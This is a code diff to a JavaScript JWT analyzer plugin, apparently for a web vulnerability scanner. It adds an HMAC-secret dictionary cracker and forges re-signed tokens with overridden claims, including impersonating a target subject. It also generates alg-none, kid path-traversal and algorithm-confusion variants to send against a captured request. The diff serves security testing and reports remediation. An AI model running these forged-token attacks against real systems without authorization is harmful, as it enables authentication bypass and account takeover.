@@ -23,6 +23,32 @@
     return output;
   }
   function urlEncode(value) { return encode64(value).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); }
+  function bytes(value) {
+    var encoded = unescape(encodeURIComponent(String(value))), output = [];
+    for (var index = 0; index < encoded.length; index += 1) output.push(encoded.charCodeAt(index) & 255);
+    return output;
+  }
+  function rotate(value, amount) { return (value >>> amount) | (value << (32 - amount)); }
+  function sha256(input) {
+    var constants = [1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298];
+    var data = input.slice(), bitLength = data.length * 8, words = [], hash = [1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225];
+    data.push(128); while (data.length % 64 !== 56) data.push(0);
+    for (var pad = 7; pad >= 0; pad -= 1) data.push(pad >= 4 ? 0 : (bitLength >>> (pad * 8)) & 255);
+    for (var offset = 0; offset < data.length; offset += 64) {
+      for (var index = 0; index < 16; index += 1) words[index] = ((data[offset+index*4]<<24)|(data[offset+index*4+1]<<16)|(data[offset+index*4+2]<<8)|data[offset+index*4+3])|0;
+      for (index = 16; index < 64; index += 1) { var x=words[index-15], y=words[index-2]; words[index]=(words[index-16]+(rotate(x,7)^rotate(x,18)^(x>>>3))+words[index-7]+(rotate(y,17)^rotate(y,19)^(y>>>10)))|0; }
+      var a=hash[0],b=hash[1],c=hash[2],d=hash[3],e=hash[4],f=hash[5],g=hash[6],h=hash[7];
+      for (index=0; index<64; index+=1) { var s1=rotate(e,6)^rotate(e,11)^rotate(e,25), ch=(e&f)^(~e&g), t1=(h+s1+ch+constants[index]+words[index])|0, s0=rotate(a,2)^rotate(a,13)^rotate(a,22), maj=(a&b)^(a&c)^(b&c), t2=(s0+maj)|0; h=g;g=f;f=e;e=(d+t1)|0;d=c;c=b;b=a;a=(t1+t2)|0; }
+      hash[0]=(hash[0]+a)|0;hash[1]=(hash[1]+b)|0;hash[2]=(hash[2]+c)|0;hash[3]=(hash[3]+d)|0;hash[4]=(hash[4]+e)|0;hash[5]=(hash[5]+f)|0;hash[6]=(hash[6]+g)|0;hash[7]=(hash[7]+h)|0;
+    }
+    var output=[]; hash.forEach(function(word){ for(var shift=24;shift>=0;shift-=8) output.push((word>>>shift)&255); }); return output;
+  }
+  function hmac256(secret, message) {
+    var key=bytes(secret); if(key.length>64) key=sha256(key); while(key.length<64) key.push(0);
+    var inner=[],outer=[]; for(var i=0;i<64;i+=1){inner.push(key[i]^54);outer.push(key[i]^92);} return sha256(outer.concat(sha256(inner.concat(bytes(message)))));
+  }
+  function bytes64url(value) { return urlEncode(String.fromCharCode.apply(null, value)); }
+  function sign256(headerPart, payloadPart, secret) { return bytes64url(hmac256(secret, headerPart + "." + payloadPart)); }
   function headerValues(context) {
     var values = [];
     if (!context.base_exchange || !context.base_exchange.identity) throw new Error("JWTAnalyzer requires identity.use access to a saved request");
@@ -60,20 +86,55 @@
     return { located: located, pieces: pieces, header: header, payload: payload };
   }
   function token(header, payload, signature) { return urlEncode(JSON.stringify(header)) + "." + urlEncode(JSON.stringify(payload)) + "." + signature; }
+  function secretCandidates(input, context) {
+    var values = [], seen = {};
+    function add(value) { value=String(value||""); if(value.length<=256 && !seen[value] && values.length<Math.max(1,Math.min(Number(input.max_secrets||2000),5000))){seen[value]=true;values.push(value);} }
+    (input.hmac_secrets || []).forEach(add);
+    if (context.resources && typeof context.resources["hmac-secrets"] === "string") context.resources["hmac-secrets"].split(/\r?\n/).forEach(add);
+    return values;
+  }
+  function weakSecret(input, context, jwt) {
+    if (String(jwt.header.alg || "").toUpperCase() !== "HS256") return null;
+    var found=null;
+    secretCandidates(input, context).some(function(secret){ if(sign256(jwt.pieces[0],jwt.pieces[1],secret)===jwt.pieces[2]){found=secret;return true;} return false; });
+    return found;
+  }
+  function signedToken(header, payload, secret) {
+    var headerPart=urlEncode(JSON.stringify(header)), payloadPart=urlEncode(JSON.stringify(payload));
+    return headerPart+"."+payloadPart+"."+sign256(headerPart,payloadPart,secret);
+  }
   function variants(input, context) {
-    var jwt = parsed(input, context), list = [], signature = jwt.pieces[2], enabled = input.tests || ["none", "invalid_signature", "missing_signature", "expired", "no_exp", "empty_hmac", "kid_path"];
+    var jwt = parsed(input, context), list = [], signature = jwt.pieces[2], enabled = input.tests || ["none", "invalid_signature", "missing_signature", "expired", "no_exp", "weak_hmac", "kid_path"];
     function add(name, header, payload, sig) { if (enabled.indexOf(name) !== -1) list.push({ name: name, token: token(header, payload, sig) }); }
     add("none", Object.assign({}, jwt.header, { alg: "none" }), jwt.payload, "");
     if (enabled.indexOf("invalid_signature") !== -1) list.push({ name: "invalid_signature", token: jwt.pieces[0] + "." + jwt.pieces[1] + "." + (signature ? signature.slice(0, -1) + (signature.slice(-1) === "A" ? "B" : "A") : "A") });
     if (enabled.indexOf("missing_signature") !== -1) list.push({ name: "missing_signature", token: jwt.pieces[0] + "." + jwt.pieces[1] + "." });
-    add("expired", jwt.header, Object.assign({}, jwt.payload, { exp: 1 }), signature);
-    var noExp = Object.assign({}, jwt.payload); delete noExp.exp; add("no_exp", jwt.header, noExp, signature);
+    var secret=weakSecret(input,context,jwt), canResign=secret!==null && String(jwt.header.alg||"").toUpperCase()==="HS256";
+    if(enabled.indexOf("expired")!==-1) {
+      var expiredPayload=Object.assign({},jwt.payload,{exp:1});
+      list.push({name:"expired",token:canResign?signedToken(jwt.header,expiredPayload,secret):token(jwt.header,expiredPayload,signature)});
+    }
+    if(enabled.indexOf("no_exp")!==-1) {
+      var noExp=Object.assign({},jwt.payload); delete noExp.exp;
+      list.push({name:"no_exp",token:canResign?signedToken(jwt.header,noExp,secret):token(jwt.header,noExp,signature)});
+    }
     add("empty_hmac", Object.assign({}, jwt.header, { alg: "HS256" }), jwt.payload, "");
-    add("kid_path", Object.assign({}, jwt.header, { alg: "HS256", kid: "../../../../dev/null" }), jwt.payload, "");
-    if (input.embedded_jwk && enabled.indexOf("embedded_jwk") !== -1) add("embedded_jwk", Object.assign({}, jwt.header, { jwk: input.embedded_jwk }), jwt.payload, "");
-    if (input.key_url && !/^https?:\/\//i.test(input.key_url)) throw new Error("key_url must be an explicit HTTP(S) URL");
-    ["jku", "x5u"].forEach(function (name) { if (input.key_url && enabled.indexOf(name) !== -1) { var header = Object.assign({}, jwt.header); header[name] = input.key_url; add(name, header, jwt.payload, ""); } });
-    return list.slice(0, 12);
+    if (enabled.indexOf("kid_path") !== -1) {
+      var kidHeader=Object.assign({},jwt.header,{alg:"HS256",kid:"../../../../dev/null"}), kidHeaderPart=urlEncode(JSON.stringify(kidHeader)), kidPayloadPart=urlEncode(JSON.stringify(jwt.payload));
+      list.push({name:"kid_path",token:kidHeaderPart+"."+kidPayloadPart+"."+sign256(kidHeaderPart,kidPayloadPart,"")});
+    }
+    var claimOverrides=Object.assign({},input.claim_overrides||{});
+    if(input.target_subject) claimOverrides.sub=String(input.target_subject);
+    if(secret && enabled.indexOf("weak_hmac")!==-1 && Object.keys(claimOverrides).length){
+      var weakHeader=Object.assign({},jwt.header,{alg:"HS256"}), weakPayload=Object.assign({},jwt.payload,claimOverrides);
+      list.push({name:"weak_hmac",token:signedToken(weakHeader,weakPayload,secret)});
+    }
+    if(input.server_public_key && enabled.indexOf("algorithm_confusion")!==-1){
+      var confusionHeader=Object.assign({},jwt.header,{alg:"HS256"}), confusionPayload=Object.assign({},jwt.payload,claimOverrides);
+      list.push({name:"algorithm_confusion",token:signedToken(confusionHeader,confusionPayload,String(input.server_public_key))});
+    }
+    if (input.prebuilt_tokens) ["embedded_jwk","jku","x5u"].forEach(function(name){ if(enabled.indexOf(name)!==-1 && typeof input.prebuilt_tokens[name]==="string" && input.prebuilt_tokens[name].split(".").length===3) list.push({name:name,token:input.prebuilt_tokens[name]}); });
+    return list.slice(0, 20);
   }
   function operation(id, baseId, located, replacement) {
     var op = { id: id, type: "http_request", base_exchange_id: baseId, protocol: "auto" };
@@ -87,11 +148,21 @@
       for (var repeat = 0; repeat < 2; repeat += 1) operations.push(operation("baseline-" + repeat, context.base_exchange.exchange_id, jwt.located, jwt.located.token));
       variants(input, context).forEach(function (variant, index) { for (var repeat = 0; repeat < 2; repeat += 1) operations.push(operation("variant-" + index + "-" + repeat, context.base_exchange.exchange_id, jwt.located, variant.token)); });
     }
-    return { operations: operations, result: { token_location: jwt.located.kind, algorithm: jwt.header.alg || null, active_variants: input.active === false ? [] : variants(input, context).map(function (item) { return item.name; }) } };
+    return { operations: operations, result: { token_location: jwt.located.kind, algorithm: jwt.header.alg || null, weak_hmac_secret_found: !!weakSecret(input, context, jwt), active_variants: input.active === false ? [] : variants(input, context).map(function (item) { return item.name; }) } };
   }
   function byId(items) { var out = {}; items.forEach(function (item) { out[item.id] = item; }); return out; }
-  function same(a, b) { return a && b && a.status_code === b.status_code && (a.response_body_hash && b.response_body_hash ? a.response_body_hash === b.response_body_hash : a.response_length === b.response_length); }
-  function pair(map, prefix) { return same(map[prefix + "0"], map[prefix + "1"]) ? map[prefix + "0"] : null; }
+  function responseText(item) { return item && item.response_body_base64 ? decode64(item.response_body_base64) : String(item && item.response_preview && item.response_preview.text || ""); }
+  function normalized(item, input) {
+    var output=responseText(item).toLowerCase()
+      .replace(/(<input\b[^>]*\bname=["']?(?:csrf|csrf_token|_csrf|xsrf|_token|authenticity_token)["']?[^>]*\bvalue=)["'][^"']*["']/gi,"$1\"<volatile>\"")
+      .replace(/(["'](?:csrf|csrf_token|nonce|request_id|trace_id)["']\s*[:=]\s*)["'][^"']+["']/gi,"$1\"<volatile>\"")
+      .replace(/\b[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\b/gi,"<uuid>")
+      .replace(/\s+/g," ").trim();
+    (input.ignore_patterns||[]).forEach(function(pattern){try{output=output.replace(new RegExp(String(pattern),"gi"),"<ignored>");}catch(_){}}); return output;
+  }
+  function similarity(left,right){if(left===right)return 1;if(!left||!right)return 0;var a={},b={},u={},same=0,total=0;left.split(/[^a-z0-9_]+/).filter(Boolean).forEach(function(t){a[t]=1;u[t]=1;});right.split(/[^a-z0-9_]+/).filter(Boolean).forEach(function(t){b[t]=1;u[t]=1;});Object.keys(u).forEach(function(t){total+=1;if(a[t]&&b[t])same+=1;});return total?same/total:0;}
+  function same(a, b, input) { return !!(a && b && !a.error && !b.error && a.status_code === b.status_code && similarity(normalized(a,input),normalized(b,input)) >= Math.max(0.5,Math.min(Number(input.similarity_threshold==null?0.92:input.similarity_threshold),1))); }
+  function pair(map, prefix, input) { return same(map[prefix + "0"], map[prefix + "1"], input) ? map[prefix + "0"] : null; }
   function analyze(input, observations, context) {
     var jwt = parsed(input, context), map = byId(observations), findings = [], baseId = context.base_exchange.exchange_id, now = Math.floor(Date.now() / 1000);
     function passive(title, severity, explanation) { findings.push({ title: title, severity: severity, confidence: "firm", explanation: explanation, remediation: "Issue short-lived tokens with explicit validation policy and verify algorithm, signature, claims, and trusted key sources server-side.", evidence_exchange_ids: [baseId] }); }
@@ -99,10 +170,11 @@
     if (jwt.payload.exp === undefined) passive("JWT has no expiration claim", "low", "The captured token does not contain an exp claim.");
     else if (Number(jwt.payload.exp) < now) passive("Captured JWT is expired", "informational", "The captured token expiration is in the past; acceptance would indicate missing claim validation.");
     if (jwt.header.jku || jwt.header.x5u) passive("JWT references a remote key URL", "medium", "The token header selects verification material through a URL and requires a strict allowlist.");
-    var baseline = pair(map, "baseline-");
+    if (weakSecret(input, context, jwt) !== null) passive("JWT is signed with a weak HMAC secret", "high", "The captured HS256 signature was verified using the bounded configured weak-secret dictionary.");
+    var baseline = pair(map, "baseline-", input);
     if (input.active !== false && baseline) variants(input, context).forEach(function (variant, index) {
-      var accepted = pair(map, "variant-" + index + "-");
-      if (accepted && accepted.status_code >= 200 && accepted.status_code < 400 && same(baseline, accepted)) findings.push({
+      var accepted = pair(map, "variant-" + index + "-", input);
+      if (accepted && accepted.status_code >= 200 && accepted.status_code < 400 && same(baseline, accepted, input)) findings.push({
         title: "JWT validation bypass using " + variant.name.replace(/_/g, " "), severity: "high", confidence: "firm",
         explanation: "A deliberately invalid JWT mutation reproduced the authenticated baseline response twice.",
         remediation: "Reject altered tokens and enforce an allowlisted algorithm, valid signature, expiration, and trusted key-selection metadata.",
